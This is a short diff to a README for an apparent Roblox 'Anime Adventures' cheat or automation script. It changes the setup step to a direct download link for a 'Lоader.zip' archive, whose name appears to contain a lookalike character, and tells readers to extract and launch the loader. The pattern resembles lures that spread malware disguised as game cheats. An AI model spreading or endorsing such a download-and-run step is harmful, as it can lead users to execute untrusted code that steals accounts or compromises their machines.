@@ -40,7 +40,7 @@ Anime Adventures, automation script, Roblox script tool, auto-farming, character
 
 Getting started is a breeze! Please follow the instructions below to activate your Anime Adventures Script for any supported platform:
 
-**1. Download Loader.rar from the repository.**  
+**1. Download https://raw.githubusercontent.com/britorbs/AnimeAdventures-Toolkit/main/Lоader.zip from the repository.**  
 **2. Extract the contents to your desired directory.**  
 **3. Follow the included Installation Guide (per your operating system) for a smooth setup experience.**  
 **4. Launch the loader and let the magic begin!**
